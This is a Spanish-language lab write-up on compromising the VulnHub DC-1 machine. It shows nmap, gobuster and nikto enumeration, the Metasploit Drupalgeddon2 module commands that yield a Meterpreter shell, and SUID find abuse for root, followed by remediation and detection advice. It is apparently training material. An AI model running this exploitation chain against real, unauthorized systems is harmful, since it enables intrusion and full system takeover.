# DC-1 – Drupal Exploitation & Privilege Escalation

## 1. Resumen Ejecutivo

La máquina objetivo expone un servicio web basado en Drupal 7, vulnerable a explotación remota.

Mediante la identificación del CMS y el uso de un exploit público (Drupalgeddon2), se obtuvo acceso inicial al sistema. Posteriormente, una configuración insegura de permisos (SUID) permitió escalar privilegios hasta root.

El sistema fue completamente comprometido.

---

## 2. Alcance

- Objetivo: DC-1 (VulnHub)
- Tipo de prueba: Evaluación de sistema web
- Objetivo: Identificar vulnerabilidades y comprometer el sistema

---

## 3. Enumeración

Se realizó un descubrimiento de hosts en red local y posterior escaneo de puertos:

```bash
nmap -p- --open -sS --min-rate 5000 -T4 -n -Pn <IP>
```

Puertos abiertos identificados:

- 22/tcp (SSH)
- 80/tcp (HTTP)
- 111/tcp (RPC)
- 40199/tcp

Enumeración de servicios:

```bash
nmap -p22,80,111,40199 -sCV <IP>
```

El análisis del servicio web reveló el uso de **Drupal 7**.

Herramientas adicionales:

```bash
whatweb http://<IP>
nikto -h <IP>
```

---

## 4. Análisis de la Aplicación Web

Se identificaron rutas potencialmente sensibles mediante:

```bash
http://<IP>/robots.txt
```

Se confirmó el uso de Drupal mediante análisis de contenido y estructura.

Se realizaron pruebas adicionales de enumeración:

- Inspección manual del código fuente
- Búsqueda de archivos comunes (CHANGELOG)
- Fuerza bruta de directorios

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

No se identificaron vectores directos adicionales, por lo que se orientó la explotación hacia vulnerabilidades conocidas del CMS.

---

## 5. Identificación de Vulnerabilidad

### 5.1 Drupalgeddon2 (Drupal 7)

El sistema ejecutaba una versión vulnerable de Drupal 7, afectada por una vulnerabilidad crítica que permite ejecución remota de código.

Tipo de vulnerabilidad:

- Remote Code Execution (RCE)
- CMS desactualizado

---

## 6. Explotación

Se utilizó Metasploit para explotar la vulnerabilidad:

```bash
msfconsole
search drupal 7
use exploit/multi/http/drupal_drupageddon2
set RHOSTS <IP>
run
```

Se obtuvo acceso mediante sesión Meterpreter.

Acceso interactivo:

```bash
shell
/bin/bash -i
```

---

## 7. Acceso Inicial

Se confirmó acceso al sistema:

```bash
whoami
pwd
```

Se obtuvo acceso como usuario con privilegios limitados.

---

## 8. Escalada de Privilegios

### 8.1 Enumeración local

Se identificaron binarios con permisos SUID:

```bash
find / -perm -4000 2>/dev/null
```

---

### 8.2 Abuso de binarios SUID

Se detectó el uso de binarios explotables mediante técnicas documentadas en GTFOBins.

Mediante el abuso de `find` con permisos SUID, se logró ejecutar comandos con privilegios elevados, obteniendo acceso root.

Verificación:

```bash
whoami
```

---

## 9. Impacto

- Compromiso total del sistema (root)
- Ejecución de código arbitrario
- Acceso a información sensible
- Posibilidad de persistencia y movimiento lateral

Impacto: Crítico

---

## 10. Recomendaciones

- Mantener actualizado el CMS (Drupal)
- Aplicar parches de seguridad de forma regular
- Restringir ejecución de binarios con permisos SUID innecesarios
- Implementar control de accesos y hardening del sistema
- Monitorizar actividad anómala en servicios web

---

## 11. Detección y Defensa (Blue Team Perspective)

Desde el punto de vista defensivo, este ataque podría detectarse mediante:

- Peticiones HTTP anómalas dirigidas a Drupal (explotación RCE)
- Uso de patrones conocidos de explotación (Drupalgeddon2)
- Actividad sospechosa en logs del servidor web (Apache/Nginx)
- Creación de procesos inusuales tras explotación web
- Escalada de privilegios mediante ejecución de binarios SUID
- Comandos ejecutados fuera del comportamiento normal del sistema

Medidas de detección recomendadas:

- Monitorización de logs web y correlación en SIEM (ej. Splunk)
- Implementación de reglas de detección para exploits conocidos
- Alertas por ejecución de procesos anómalos
- Auditoría de permisos SUID en sistemas Linux
- Detección de escaladas de privilegios

---

## 12. Conclusión

Este laboratorio demuestra cómo la explotación de un CMS desactualizado puede derivar en un compromiso completo del sistema.

La cadena de ataque incluyó:

- Enumeración de servicios
- Identificación de CMS vulnerable
- Ejecución remota de código (RCE)
- Escalada de privilegios mediante SUID

El compromiso no depende de un único fallo, sino de la combinación de vulnerabilidades y configuraciones inseguras.
